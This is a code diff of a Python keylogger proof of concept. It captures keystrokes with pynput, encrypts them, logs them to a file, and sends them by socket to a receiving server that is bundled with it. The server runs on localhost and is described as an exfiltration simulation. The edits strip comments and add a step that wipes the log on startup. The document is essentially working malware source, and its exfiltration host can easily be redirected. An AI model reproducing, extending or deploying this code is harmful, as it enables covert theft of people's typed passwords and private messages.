@@ -2,30 +2,24 @@ import os
 import sys
 import threading
 import socket
-import base64
 from datetime import datetime
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
 # === Configuration ===
-LOG_DIR = os.path.abspath(".")  # Changed output directory to current working directory
+LOG_DIR = os.path.abspath(".")  # Store logs in current working directory
 LOG_FILE = os.path.join(LOG_DIR, "keylog.enc")
 KEY_FILE = os.path.join(LOG_DIR, "secret.key")
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
-# Removed Linux autostart persistence due to current directory usage (can be adapted if needed)
-KILL_SWITCH_KEY = keyboard.Key.esc  # Press ESC to kill
-
-# === Helpers ===
+KILL_SWITCH_KEY = keyboard.Key.esc  # Press ESC to stop keylogger
 
 def create_persistence():
-    """No persistence for current directory version to keep PoC simple and portable."""
-    # Persistence normally requires user home directory; skipping here as output is local dir.
+    # No persistence implemented for local dir PoC
     pass
 
 def load_or_generate_key():
-    # Check if key exists; else generate and store it.
     if not os.path.exists(KEY_FILE):
         os.makedirs(LOG_DIR, exist_ok=True)
         key = Fernet.generate_key()
@@ -37,25 +31,26 @@ def load_or_generate_key():
             return f.read()
 
 def encrypt_data(fernet: Fernet, data: str) -> bytes:
-    # Data must be bytes
     return fernet.encrypt(data.encode())
 
 def decrypt_data(fernet: Fernet, data: bytes) -> str:
     return fernet.decrypt(data).decode()
+
+def overwrite_log_file():
+    # Clear the log file by opening it once in write mode
+    with open(LOG_FILE, 'wb') as f:
+        pass
 
 def append_encrypted_log(data: bytes):
     with open(LOG_FILE, 'ab') as f:
         f.write(data + b'\n')
 
 def send_data_to_server(data: bytes):
-    # Simulate exfiltration (connect to localhost server)
     try:
         with socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=5) as sock:
             sock.sendall(data + b'\n')
     except Exception as e:
         print(f"[!] Exfiltration failed: {e}")
-
-# === Keylogger Implementation ===
 
 class EncryptedKeylogger:
     def __init__(self):
@@ -95,6 +90,7 @@ class EncryptedKeylogger:
     def start(self):
         print("[*] Starting Encrypted Keylogger - Press ESC to exit.")
         create_persistence()
+        overwrite_log_file()  # Clear old logs on start
         self.listener.start()
         try:
             while not self.stop_event.is_set():
@@ -108,8 +104,6 @@ class EncryptedKeylogger:
         self.stop_event.set()
         self.flush_logs()
         self.listener.stop()
-
-# === Simple Server to Receive Exfiltrated Data (for PoC) ===
 
 def run_server():
     print(f"[*] Starting localhost server on {SERVER_HOST}:{SERVER_PORT} for data exfiltration simulation")
@@ -133,8 +127,6 @@ def run_server():
                         print(data)
         except KeyboardInterrupt:
             print("\n[*] Server stopped.")
-
-# === Main Entry Point ===
 
 def main():
     import argparse
